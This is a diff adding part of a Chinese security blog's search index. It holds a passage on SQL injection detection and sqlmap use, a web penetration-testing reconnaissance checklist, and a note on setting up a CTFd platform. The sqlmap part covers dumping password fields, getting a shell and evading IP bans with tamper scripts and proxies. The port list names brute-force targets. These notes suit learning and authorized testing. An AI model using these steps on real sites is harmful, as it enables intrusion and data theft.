+<h1 id="其他注入点检测方法"><a href="#其他注入点检测方法" class="headerlink" title="其他注入点检测方法"></a>其他注入点检测方法</h1><blockquote>
+<p><a href="http://xxx.com/news.asp?id=123-1" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123-1</a></p>
+</blockquote>
+<p>如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞；</p>
+<p>URL地址后面加上 -0，</p>
+<blockquote>
+<p><a href="http://xxx.com/news.asp?id=123-0" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123-0</a></p>
+</blockquote>
+<p>返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，是数字型的。</p>
+<p> 在URL的地址后面加上’%2B’</p>
+<blockquote>
+<p><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a><br><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a> ‘%2B’，返回的页面和1同；<br><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a> ‘%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，</p>
+</blockquote>
+<p>则表示存在注入点，是文本型的。</p>
+<hr>
+<h1 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h1><p>1.对文本时使用 -r<br><img src="/images/pasted-2.png" alt="upload successful"><br>对链接时使用 -u<br>得到的基本信息如下</p>
+<p><img src="/images/pasted-3.png" alt="upload successful"><br>2.得到当前数据库名</p>
+<p><img src="/images/pasted-4.png" alt="upload successful"></p>
+<p><img src="/images/pasted-5.png" alt="upload successful"><br>3.对数据库表名进行枚举</p>
+<p><img src="/images/pasted-6.png" alt="upload successful"></p>
+<p><img src="/images/pasted-7.png" alt="upload successful"><br>4.用–columns对表中的列进行枚举</p>
+<p><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p><img src="/images/pasted-9.png" alt="upload successful"><br>5.获取user表中的name和password字段</p>
+<p><img src="/images/pasted-10.png" alt="upload successful"><br>密码为密文，SQLmap会自动询问，是否爆破，选择“是”即可开始使用SQLMAP自带的字典进行爆破。<br>6。获取shell，选择后台语言</p>
+<p><img src="/images/pasted-11.png" alt="upload successful"><br><strong>注意</strong><br>-p 指定参数<br>-data 选择哪些数据<br>–proxy=域名:端口  代理<br>–technique 指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
+<p>is-dba            当前用户权限</p>
+<p>dbs            所有数据库</p>
+<p>current-db        网站当前数据库</p>
+<p>users            所有数据库用户<br>current-user        当前数据库用户<br>tables            参数:列表名<br>columns            参数:列字段<br>dump            参数:下载数据<br><strong>测试时防止ip被ban，可用以下方法:</strong><br>python sqlmap.py -u 链接 -p query_type –random-agent –tamper=space2comment –delay=3.5 –time-sec=60 –proxy=<a href="http://ip:端口">http://ip:端口</a></p>
+<p>tamper  “space2comment.py”   将空格替换成/**/<br>equaltolike.py,                            将等号替换成like<br>symboliclogical.py                    用 &amp;&amp; 替换 and ，用 || 替换 or</p>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web渗透笔记之信息收集</title>
+    <url>/2019/03/27/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="0x01-whois查询"><a href="#0x01-whois查询" class="headerlink" title="0x01 whois查询"></a>0x01 whois查询</h2><p>主要用于查询一些网站站长的邮箱，手机号等信息。可结合社会工程学生成字典爆破网站密码</p>
+<ol>
+<li><p><a href="https://www.aizhan.com/" target="_blank" rel="noopener">站长之家</a></p>
+</li>
+<li><p><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长工具</a></p>
+</li>
+<li><p>kali的whois命令</p>
+<a id="more"></a>
+<h2 id="0x02-cms指纹识别"><a href="#0x02-cms指纹识别" class="headerlink" title="0x02 cms指纹识别"></a>0x02 cms指纹识别</h2><p>找到网站的指纹信息，或许可让你更轻松的让你定位网站的漏洞。比如网站是dedecms的网站，这时可尝试在网上寻找对应版本的漏洞是否存在。一些开源的cms还可尝试进行代码审计，找到一些别人没有发现的漏洞</p>
+</li>
+<li><p>各种在线cms识别工具</p>
+</li>
+<li><p><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb</a></p>
+</li>
+<li><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">bugscan</a></p>
+</li>
+<li><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">云悉</a> （推荐）</p>
+</li>
+<li><p><a href="http://finger.tidesec.net/home/index/index.html" target="_blank" rel="noopener">TideFinger</a></p>
+<h2 id="0x03-目录扫描"><a href="#0x03-目录扫描" class="headerlink" title="0x03 目录扫描"></a>0x03 目录扫描</h2><p>个人常用(当然，目录扫描还是看字典，如果字典强无所谓哪个工具)</p>
+</li>
+</ol>
+<ol>
+<li>御剑</li>
+<li>pker多线程后台扫描器</li>
+</ol>
+<p>爬虫：</p>
+<ol>
+<li>burpsuite</li>
+<li>AWVS</li>
+</ol>
+<p>穷举</p>
+<ol>
+<li>dirbuster<h2 id="0x04-子域名扫描"><a href="#0x04-子域名扫描" class="headerlink" title="0x04 子域名扫描"></a>0x04 子域名扫描</h2>最快的方法是先查看是否存在DNS域传送漏洞<br>window下使用nslookup，linux使用dig</li>
+</ol>
+<p><img src="/images/pasted-45.png" alt="upload successful"></p>
+<ul>
+<li>搜索引擎枚举：<code>site:xxx.com</code></li>
+<li>子域名挖掘机layer等工具使用</li>
+<li>证书透明度公开日志枚举<ol>
+<li><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></li>
+<li><a href="http://censys.io" target="_blank" rel="noopener">http://censys.io</a></li>
+</ol>
+</li>
+<li><ol>
+<li><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
+<li><a href="https://findsubdomains.com/" target="_blank" rel="noopener">https://findsubdomains.com/</a></li>
+</ol>
+</li>
+<li><a href="https://www.aizhan.com" target="_blank" rel="noopener">爱站网</a></li>
+<li><a href="http://i.links.cn/subdomain/" target="_blank" rel="noopener">站长帮手网</a></li>
+<li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">DNSdumpster</a><h2 id="0x05-推荐网站"><a href="#0x05-推荐网站" class="headerlink" title="0x05 推荐网站"></a>0x05 推荐网站</h2>备案信息查询</li>
+</ul>
+<ol>
+<li><p><a href="https://www.tianyancha.com" target="_blank" rel="noopener">天眼查</a></p>
+</li>
+<li><p><a href="http://www.beianbeian.com" target="_blank" rel="noopener">ICP备案查询网</a></p>
+<p>第三方接口查询网站</p>
+<ol>
+<li><a href="https://community.riskiq.com/" target="_blank" rel="noopener">RiskIQ</a></li>
+<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dnsdb</a></li>
+<li><a href="https://censys.io/" target="_blank" rel="noopener">censys</a></li>
+</ol>
+</li>
+</ol>
+<p>快照信息</p>
+<ul>
+<li><a href="http://web.archive.org/" target="_blank" rel="noopener">历史归档</a>        (类似百度快照，但更全一些，需fq)</li>
+</ul>
+<p>历史DNS收集:</p>
+<ul>
+<li><a href="http://site.ip138.com" target="_blank" rel="noopener">http://site.ip138.com</a></li>
+</ul>
+<p>漏洞平台：</p>
+<ul>
+<li><p>hackone</p>
+</li>
+<li><p>乌云镜像</p>
+<p>  ps:这两个平台有暴露漏洞详细细节，可能找到一些目标站信息</p>
+</li>
+</ul>
+<p>大数据平台信息收集</p>
+<ol>
+<li><a href="https://github.com" target="_blank" rel="noopener">github</a></li>
+<li><a href="https://www.zoomeye.org" target="_blank" rel="noopener">钟馗之眼</a></li>
+<li><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA Pro</a></li>
+<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></li>
+<li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">威胁情报社区</a></li>
+</ol>
+<h2 id="0x05-搜索引擎"><a href="#0x05-搜索引擎" class="headerlink" title="0x05 搜索引擎"></a>0x05 搜索引擎</h2><p>谷歌语法</p>
+<ul>
+<li>site 指定域名</li>
+<li>intext 正文中存在关键字的网页</li>
+<li>intitle 标题中存在关键字的网页</li>
+<li>info 一些基本信息</li>
+<li>inurl URL存在关键字的网页</li>
+<li>filetype 搜索指定文件类型  <blockquote>
+<ol>
+<li>site:xxx.com inurl:upload.aspx|admin.aspx<br>… …</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h2 id="0x06-端口扫描"><a href="#0x06-端口扫描" class="headerlink" title="0x06  端口扫描"></a>0x06  端口扫描</h2><p> 个人常用御剑端口扫描器扫端口（因为比nmap快很多），如果要准确点的话建议超时调大，线程调小</p>
+<blockquote>
+<p>21 ftp 主要看是否支持匿名，也可以跑弱口令<br>22 ssh 弱口令爆破<br>23 telnet 弱口令爆破<br>25 smtp  弱口令爆破<br>80 web站点 常见web漏洞以及是否 为一些管理后台<br>135 Location Service<br>139: Samba服务<br>161 snmp public 弱口令<br>389 idap 是否匿名访问<br>443 openssl 心脏出血漏洞以及一些web漏洞<br>445 smb跑弱口令，检测是否有ms_08067等溢出<br>875 rsync 是否匿名访问，可以跑弱口令<br>1433 mssql跑弱口令<br>1521 oracle 弱口令<br>2601，2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令直接漫游内网<br>3306 mysql跑弱口令<br>3389 window远程桌面 弱口令爆破<br>4440 rundeck web<br>4848 glassfish web中间件 弱口令<br>4899-Radmin<br>5432    PostgreSQL<br>5900    vnc<br>6379  redis未授权访问<br>11211 memcached未授权访问<br>27017 MongoDB未授权访问<br>43958 Serv-U  提权<br> …. …</p>
+</blockquote>
+<h2 id="0x07-旁注C段"><a href="#0x07-旁注C段" class="headerlink" title="0x07 旁注C段"></a>0x07 旁注C段</h2><p>旁注即看同ip下是否有运行其他网站，若有则当主网站入侵困难时，可尝试从其他网站入手</p>
+<p>找C段时我常用<br> <a href="https://fofa.so/" target="_blank" rel="noopener">FOFA Pro</a><br> <a href="https://censys.io/" target="_blank" rel="noopener">censys</a><br> <a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">httpscan</a> </p>
+<h2 id="0x08-CDN"><a href="#0x08-CDN" class="headerlink" title="0x08 CDN"></a>0x08 CDN</h2><h5 id="判断"><a href="#判断" class="headerlink" title="判断:"></a>判断:</h5><p>使用爱站网或站长之家的 <strong>ping</strong>功能,查看各地ip情况,若不一样，则说明存在cdn。</p>
+<p>找到真实ip:</p>
+<blockquote>
+<p>通过邮件(看邮箱头源 ip)找真实 ip（可靠）<br>通过查询域名历史 ip，<a href="http://toolbar.netcraft.com（借鉴）" target="_blank" rel="noopener">http://toolbar.netcraft.com（借鉴）</a><br>通过 znmap 全网爆破查询真实 ip<br>查子域名，因为有的子域名没有使用CDN</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfd平台搭建体会</title>
+    <url>/2019/03/13/ctfd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E4%BD%93%E4%BC%9A/</url>
+    <content><![CDATA[<h3 id="环境-cenOS7-2-CTFd-V2-0-10-2-22-MariaDB"><a href="#环境-cenOS7-2-CTFd-V2-0-10-2-22-MariaDB" class="headerlink" title="环境 cenOS7.2  CTFd_V2.0  10.2.22-MariaDB"></a>环境 cenOS7.2  CTFd_V2.0  10.2.22-MariaDB</h3><ul>
+<li><p>昨天就开始搭建这个平台，但发现一直不成功，网站就是运行不了。</p>
+</li>
+<li><p>今天下午重置了系统盘，初始化系统盘继续尝试</p>
+</li>
+<li><p>看网上的步骤一步一步运行，仔细观察。</p>
+<a id="more"></a>
+<blockquote>
+<ol>
+<li>发现了第一个坑，Mysql-python教程里sql是小写，其实系统要求要大写。昨天就是这个漏装了。</li>
+<li>昨天的时候，按网上的教程要求改host的值，但文档里怎么没有，翻来覆去都找不到。无奈自己先给加了个。当时已有不详的预感……</li>
+<li>果然，运行serve.py的时候发现报错。看了下错误说明，发现是数据库的问题，百思不得其解。</li>
+<li>不过花了好久时间，终于被我从一篇<a href="https://www.yad0.com/technology_sharing/various_tutorials/540.html/comment-page-1#comment-11" target="_blank" rel="noopener">博文</a>中找到原因了。原来网上的教程绝大多数都是1.0版本，导致一直安装不上。我装的CTFd是v2.0版本，是最新的，需要使用高于10.2版本的Mariadb数据库，因此需要<br><a href="https://www.cnblogs.com/operationhome/p/9141881.html" target="_blank" rel="noopener">升级数据库</a></li>
+</ol>
+</blockquote>
+<p><strong>唉，看教程时还是要细心！</strong>。特别是后面发现有github的ctfd有docker搭建教程，直接一键搭好。。。emmmm<br>也算有所收获吧，之前除了DVWA，和自己的博客外就没怎么搭过环境。哈哈，也是因为自己懒，sqlilab，upload等环境，都是直接网上用别人的靶机。</p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>瞎折腾</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+</search>
